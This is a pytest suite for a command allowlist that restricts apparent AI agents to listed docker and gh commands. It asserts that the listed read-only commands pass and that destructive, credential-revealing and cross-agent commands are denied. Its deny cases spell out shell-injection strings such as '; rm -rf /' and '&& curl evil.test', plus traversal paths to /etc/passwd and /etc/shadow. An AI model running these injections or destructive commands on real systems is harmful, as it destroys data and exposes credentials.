"""Command allowlist boundary: what may run, and what must never run."""

from __future__ import annotations

import pytest

from citadel.tools import CommandDenied, load_allowlist, match


def test_allowlist_covers_exactly_the_documented_agents() -> None:
    assert {entry.agent for entry in load_allowlist()} == {"docker", "github"}


@pytest.mark.parametrize(
    "tokens",
    [
        ["docker", "compose", "ps"],
        ["docker", "compose", "ps", "--all"],
        ["docker", "compose", "ps", "--format", "json"],
        ["docker", "compose", "ps", "--format=json"],
        ["docker", "compose", "logs", "checkout-api"],
        ["docker", "compose", "logs", "checkout-api", "--tail", "100"],
        ["docker", "compose", "logs", "--since", "10m", "checkout-api"],
        ["docker", "compose", "config", "--services"],
        ["docker", "ps", "-a"],
        ["docker", "inspect", "--format", "{{.State.Status}}", "checkout-api"],
    ],
)
def test_allowed_docker_commands(tokens: list[str]) -> None:
    command = match(tokens, agent="docker")
    assert command.tier == "T0"


@pytest.mark.parametrize(
    "tokens",
    [
        ["gh", "pr", "list"],
        ["gh", "pr", "list", "--repo", "acme/infra", "--state", "open"],
        ["gh", "pr", "view", "42", "--json", "title,state"],
        ["gh", "pr", "diff", "42", "--name-only"],
        ["gh", "repo", "view", "--json", "defaultBranchRef"],
        ["gh", "run", "list", "--limit", "5"],
        ["gh", "issue", "list", "--label", "bug"],
    ],
)
def test_allowed_github_commands(tokens: list[str]) -> None:
    assert match(tokens, agent="github").agent == "github"


def test_restart_is_the_only_docker_write() -> None:
    t1 = [entry.id for entry in load_allowlist() if entry.tier == "T1"]
    assert t1 == ["docker.compose.restart"]


@pytest.mark.parametrize(
    "tokens",
    [
        ["docker", "run", "--privileged", "alpine"],
        ["docker", "exec", "checkout-api", "sh"],
        ["docker", "compose", "up", "-d"],
        ["docker", "compose", "down"],
        ["docker", "system", "prune", "-a"],
        ["docker", "rm", "-f", "checkout-api"],
        ["docker", "ps", "--format", "json", "--extra"],
        ["docker", "compose", "config", "extra-positional"],
        ["docker", "inspect", "a", "b", "c"],
    ],
)
def test_dangerous_or_unlisted_docker_commands_are_denied(tokens: list[str]) -> None:
    with pytest.raises(CommandDenied):
        match(tokens, agent="docker")


@pytest.mark.parametrize(
    "tokens",
    [
        ["gh", "api", "/repos/acme/infra"],
        ["gh", "api", "-X", "DELETE", "/repos/acme/infra"],
        ["gh", "pr", "merge", "42"],
        ["gh", "pr", "create", "--title", "x"],
        ["gh", "auth", "token"],
        ["gh", "repo", "delete", "acme/infra"],
        ["gh", "secret", "set", "TOKEN"],
    ],
)
def test_github_escape_hatches_are_denied(tokens: list[str]) -> None:
    with pytest.raises(CommandDenied):
        match(tokens, agent="github")


@pytest.mark.parametrize(
    "tokens",
    [
        ["docker", "compose", "ps", ";", "rm", "-rf", "/"],
        ["docker", "compose", "ps", "&& curl evil.test"],
        ["docker", "compose", "ps", "$(whoami)"],
        ["docker", "compose", "ps", "`id`"],
        ["docker", "compose", "ps", "|", "sh"],
        ["docker", "compose", "logs", "checkout-api", ">", "/etc/passwd"],
    ],
)
def test_shell_injection_is_denied(tokens: list[str]) -> None:
    with pytest.raises(CommandDenied):
        match(tokens, agent="docker")


@pytest.mark.parametrize(
    "tokens",
    [
        ["docker", "inspect", "../../etc/passwd"],
        ["docker", "compose", "logs", "/etc/shadow"],
        ["/usr/bin/docker", "ps"],
        ["/bin/sh", "-c", "docker ps"],
    ],
)
def test_path_traversal_and_absolute_binaries_are_denied(tokens: list[str]) -> None:
    with pytest.raises(CommandDenied):
        match(tokens, agent="docker")


def test_agents_cannot_use_each_others_commands() -> None:
    """Red team: the docker agent trying to reach GitHub, and vice versa."""
    with pytest.raises(CommandDenied):
        match(["gh", "pr", "list"], agent="docker")
    with pytest.raises(CommandDenied):
        match(["docker", "ps"], agent="github")


def test_unknown_agent_is_denied() -> None:
    with pytest.raises(CommandDenied):
        match(["docker", "ps"], agent="researcher")


def test_empty_command_is_denied() -> None:
    with pytest.raises(CommandDenied):
        match([], agent="docker")
